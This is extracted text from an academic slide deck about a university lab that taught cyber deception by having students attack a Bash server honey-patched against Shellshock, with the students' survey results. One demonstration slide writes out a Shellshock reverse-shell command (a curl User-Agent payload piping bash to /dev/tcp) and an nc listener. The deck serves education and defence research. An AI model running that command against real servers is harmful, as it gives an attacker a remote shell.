<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>ERIK JONSSON SCHOOL OF ENGINEERING AND COMPUTER SCIENCE Cybersecurity Research and Education Institute</p>
    <p>Experiences with Honey-Patching in Active Cyber Security Education</p>
    <p>Frederico Araujo Mohammad Shapouri</p>
    <p>Sonakshi Pandey Kevin Hamlen</p>
    <p>The University of Texas at Dallas</p>
  </div>
  <div class="page">
    <p>Cyber Deception Increasingly Important</p>
    <p>Advanced malware attacks often undertake elaborate user deceptions  Stuxnets replaying of pre-recorded equipment readings  over $23K losses per day due to government official impersonation according</p>
    <p>to FBI</p>
    <p>Modern cyber defenders must be aware of attackers strategies and techniques in order to anticipate their actions  think like an attacker  skills for creating and mitigating deceptive software  limit attack surface exposed to cyber criminals</p>
    <p>U.S. Air Force focus area: Cyber Deception, 2015</p>
  </div>
  <div class="page">
    <p>Challenges of Teaching Cyber Deception</p>
    <p>Cyber deception defense is exceptionally difficult to convey effectively in a traditional classroom  structured lectures and assignments  rehearsed, time-honored mode of thinking  antithetical to real-world encounters involving advanced attackers</p>
    <p>CTF are a promising approach for teaching practical active defense  often omit Cyber Deception</p>
  </div>
  <div class="page">
    <p>Cyber Deception Education Lab</p>
    <p>Lab designed to teach active cyber defense and attacker-deception to CS students</p>
    <p>strategy for effectively communicating deceptive technical skills</p>
    <p>leveraging the new paradigm of honey-patching [CCS14]</p>
    <p>Honey-patching used to teach cyber deception in ways that overcome the otherwise predictable classroom environment</p>
    <p>Lab organized with the help of UTDs Computer Security Group student association</p>
    <p>covered by UTD IRB approval MR15-185</p>
    <p>conducted by personnel NIH-certified in protection of human subjects</p>
  </div>
  <div class="page">
    <p>Outline</p>
  </div>
  <div class="page">
    <p>Honey-Patching</p>
    <p>probe payload</p>
    <p>attacker</p>
    <p>no! web server</p>
    <p>(patched)</p>
    <p>web server (patched)</p>
    <p>web server (patched)</p>
    <p>web server (patched)</p>
    <p>web server (patched)</p>
    <p>web server (unpatched)</p>
    <p>#*?&amp;#?*#</p>
    <p>Targets 74.125.205.231</p>
    <p>(unpatched)</p>
    <p>web server (honey-patched)</p>
    <p>...</p>
    <p>attack payload</p>
    <p>credit card # fake credit card #</p>
  </div>
  <div class="page">
    <p>Honey-Patching</p>
    <p>patch</p>
    <p>honey-patch</p>
  </div>
  <div class="page">
    <p>Honey-Patching</p>
    <p>container pool</p>
    <p>target</p>
    <p>server application honey-patched</p>
    <p>decoy</p>
    <p>server application unpatched clone</p>
    <p>reverse proxy</p>
    <p>controller</p>
  </div>
  <div class="page">
    <p>Advantages</p>
    <p>Frustrate attacker vulnerability-probing</p>
    <p>mask patching lapses</p>
    <p>increase attacker risk</p>
    <p>Collect preparatory counterreconnaissance against directed attacks</p>
    <p>Honeypot lives inside the live server, not as a separate decoy machine</p>
    <p>Unique opportunities for attacker disinformation and misdirection</p>
    <p>Keep attackers on the hook longer</p>
    <p>Leak arbitrary (fake) secrets</p>
    <p>Fool attackers into disclosing their real payloads</p>
  </div>
  <div class="page">
    <p>Outline</p>
  </div>
  <div class="page">
    <p>Lab Overview</p>
    <p>Exploitation 1:05 PM - 1:25 PM</p>
    <p>Preparation 2:10 PM - 2:50 PM</p>
    <p>Active Defense FeedbackSurvey</p>
    <p>Survey 1:25 PM - 2:00 PM</p>
    <p>Exploitation Feedback 2:10 PM - 2:50 PM</p>
    <p>Active Defense 1:05 PM - 1:25 PM</p>
    <p>Preparation</p>
    <p>Preparation FeedbackSurvey 1:25 PM - 2:00 PM</p>
    <p>Exploitation 2:10 PM - 2:50 PM</p>
    <p>Active Defense</p>
    <p>Survey Feedback 1:25 PM - 2:00 PM</p>
    <p>Exploitation 1:05 PM - 1:25 PM</p>
    <p>Preparation 2:10 PM - 2:50 PM</p>
    <p>Active Defense</p>
    <p>Preparation 2:10 PM - 2:50 PM</p>
    <p>Active Defense FeedbackSurvey 1:25 PM - 2:00 PM</p>
    <p>Exploitation</p>
  </div>
  <div class="page">
    <p>Infrastructure &amp; Preparation</p>
    <p>Target Server</p>
    <p>honey-patched Bash against Shellshock, setup with Apache HTTP + mod_cgi</p>
    <p>decoys instrumented with file-system and network monitors</p>
    <p>Attacker Environment</p>
    <p>VMs deployed as linked clones of a base image containing all lab material</p>
    <p>guests accessible from lab workstations or BYOD wireless network</p>
    <p>VMware ESXi</p>
    <p>server</p>
    <p>attacker1</p>
    <p>attackern</p>
    <p>campus networklab</p>
    <p>subnet</p>
  </div>
  <div class="page">
    <p>Honey-Patched Target</p>
    <p>Abbreviate patch for CVE-2014-6271</p>
    <p>Honey-patch for CVE-2014-6271</p>
  </div>
  <div class="page">
    <p>Decoy Monitoring</p>
    <p>Decoys file-system monitoring</p>
    <p>Decoys deep inspection of network packets</p>
  </div>
  <div class="page">
    <p>Outline</p>
  </div>
  <div class="page">
    <p>First Survey (2:002:10 pm)</p>
    <p>Q1. Did you succeed in attacking the server? (yes/no) If yes, what actions did you take after you were able to exploit the vulnerability? Yes: 7/7, No: 0/7</p>
    <p>Q2. Did the vulnerable server raise any red flags? (yes/no) Yes: 0/7, No: 7/7</p>
    <p>Q3. If Yes to Q2: Did you think you were interacting with a real server (i.e., not a trap)? (yes/no) If not, please explain.</p>
    <p>Q4. If Yes to Q2: Did you observe anything anomalous in any of the following: filesystem, server responses? (yes/no) If yes, how long until you observed them?</p>
  </div>
  <div class="page">
    <p>Second Survey (2:503:00 pm)</p>
    <p>Q1. After your were told that the system was honey-patched, what actions did you take? Did you try to hack the system? (yes/no) Yes: 1/7, No: 6/7</p>
    <p>Q2. If you were given enough time, what would you attempt to do?</p>
    <p>Q3. Did you find this exercise useful for expanding your cyber security education? (yes/no) Yes: 7/7, No: 0/7</p>
    <p>Q4. Were the tutorial instructions clear? (yes/no) If not, please suggest improvements. Yes: 7/7, No: 0/7</p>
    <p>Q5. Were the student instructors helpful and responsive? (yes/no) Yes: 7/7, No: 0/7</p>
    <p>Q6. Did this exercise increase your interest in the research side of cyber security? (yes/no) Please elaborate. Yes: 7/7, No: 0/7</p>
  </div>
  <div class="page">
    <p>Deceptiveness of Honey-Patching</p>
    <p>If you were given enough time, what would you attempt to do?</p>
    <p>look into the services running in the decoy  note files of interest and their properties (e.g., author, permission)  look for red flags that could be used to fingerprint a honey-patched system  attempt to find vulnerabilities in the honey-patch components</p>
    <p>e.g., front-end proxy  look for security flaws and exploit them</p>
    <p>Did the vulnerable server raise any red flags? (yes/no) Yes: 0/7, No: 7/7</p>
    <p>deception was successful for the entire duration of the first exercise</p>
  </div>
  <div class="page">
    <p>Learning Experience</p>
    <p>Did you find this exercise useful for expanding your cyber security education? (yes/no) Yes: 7/7, No: 0/7</p>
    <p>students found it exciting to see how the exploit worked first-hand  learning attack and active defense concepts seems to entice students</p>
    <p>curiosity and develop their interest in applied cyber security  lab encouraged students to seek deception-exposing strategies and examine</p>
    <p>exploit outcomes critically rather than accepting them at face value</p>
    <p>Did this exercise increase your interest in the research side of cyber security? (yes/no) Please elaborate. Yes: 7/7, No: 0/7</p>
    <p>received constructive feedback from students, including proposals for new challenges, different methods of attack, and alternative defense methods</p>
    <p>enjoyed seeing the research being done to take advantage [of attacks]  use honey-patching as a strategy to enhance incidence response</p>
  </div>
  <div class="page">
    <p>Outline</p>
  </div>
  <div class="page">
    <p>Participants</p>
    <p>The lab was open to any student willing to participate</p>
    <p>no background requirements</p>
    <p>Advertisement through security and computer student organizations homepages and mailing lists</p>
    <p>lab promoted as a hands-on challenge on Shellshock exploitation and defense</p>
    <p>Participants</p>
    <p>all CS majors, with limited experience in cyber security</p>
    <p>only a few students had performed penetration tests before</p>
    <p>lab was staffed by one PhD student and two Masters students who acted as tutors for the lab</p>
  </div>
  <div class="page">
    <p>Interactive Demonstration</p>
    <p>Delivered at the end of the preparation session</p>
    <p>no-one-left-behind exercise</p>
    <p>provided clarifications on concepts introduced in the initial lab presentation</p>
    <p>basic working knowledge of Shellshock exploitation</p>
    <p>Worked well for our small group</p>
    <p>but it would probably need to be adjusted for larger number of students</p>
    <p>attacker server</p>
    <p>curl -A &quot;() {:;};/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot; ...</p>
    <p>nc -l port</p>
    <p>reverse s hell login.cgi</p>
  </div>
  <div class="page">
    <p>Lab Organization</p>
    <p>Short, alternating structured (lecturing, demo) and unstructured (free hands-on) sessions  keep students focused and motivated</p>
    <p>freedom of experimentation</p>
    <p>good balance between guided and exploratory learning</p>
    <p>Concealment of honey-patching deception during first hands-on session  raised students interest relative to disclosing it upfront</p>
    <p>well-received by students: the deception was benign and educational</p>
    <p>evoked an element of surprise that instill curiosity in students</p>
    <p>Increase in interest after introducing the research on honey-patching  evidenced by the surge in questions and discussions</p>
  </div>
  <div class="page">
    <p>Cyber Deception CTF</p>
    <p>Offensive-defensive team challenge</p>
    <p>participants will learn and practice deception and anti-deception techniques</p>
    <p>initial target: TexSAW</p>
    <p>two different CTF styles</p>
    <p>- students trained on honey-patching - capture the flag while avoiding submitting captured decoy flags - flag validation happens at the end of predetermined phases</p>
    <p>- enter teams trained in cyber-deceptive active defense into preexisting CTFs, without other teams knowing</p>
    <p>- if successful, this can provide empirical evidence of the efficacy of honey-patching and other deceptive defenses</p>
  </div>
  <div class="page">
    <p>Outline</p>
  </div>
  <div class="page">
    <p>Conclusions</p>
    <p>Cyber security programs should complement the classroom experience with hands-on exercises</p>
    <p>invite students to try new research</p>
    <p>learn state-of-the-art cyber defense tools and techniques</p>
    <p>Cyber deception is an increasingly important component of cyber defenses</p>
    <p>level the battlefield that otherwise favors attackers</p>
    <p>arms race, which depends upon effective skills</p>
    <p>Honey-patching as educational tool</p>
    <p>links deception to penetration testing</p>
    <p>introduces deception in a benign and interesting way</p>
    <p>help overcome the otherwise predictable (non-deceptive) classroom environment</p>
  </div>
  <div class="page">
    <p>The End</p>
    <p>Thank you!</p>
    <p>Questions?</p>
    <p>Frederico Araujo</p>
    <p>(frederico.araujo@utdallas.edu)</p>
  </div>
</Presentation>
